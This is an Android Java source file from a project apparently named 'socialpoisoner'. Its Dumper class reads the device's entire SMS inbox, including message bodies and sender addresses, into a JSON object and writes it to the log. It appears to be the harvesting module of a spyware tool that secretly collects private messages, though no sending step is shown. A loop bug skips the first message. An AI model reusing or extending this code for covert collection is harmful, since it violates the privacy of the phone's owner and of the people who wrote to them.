package com.cakeman.doctorrabb.socialpoisoner.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by doctorrabb on 15.07.16.
 */
public class Dumper {
    public JSONObject dumpSMS (Context context) {

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {

            Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

            JSONObject jsonObject = new JSONObject();
            try {
                jsonObject.put("sms", new JSONArray());
            } catch (JSONException e) {
                return null;
            }

            cursor.moveToFirst();

            while (cursor.moveToNext()) {
                String body = cursor.getString(cursor.getColumnIndex("body")).toString();
                String address = cursor.getString(cursor.getColumnIndex("address")).toString();

                try {
                    jsonObject.getJSONArray("sms").put(new JSONObject().put("body", body).put("address", address));
                } catch (JSONException e) {
                    return null;
                }
            }

            cursor.close();

            Log.d ("SMS JSON List", jsonObject.toString());

            return jsonObject;

        }
        return null;
    }

}
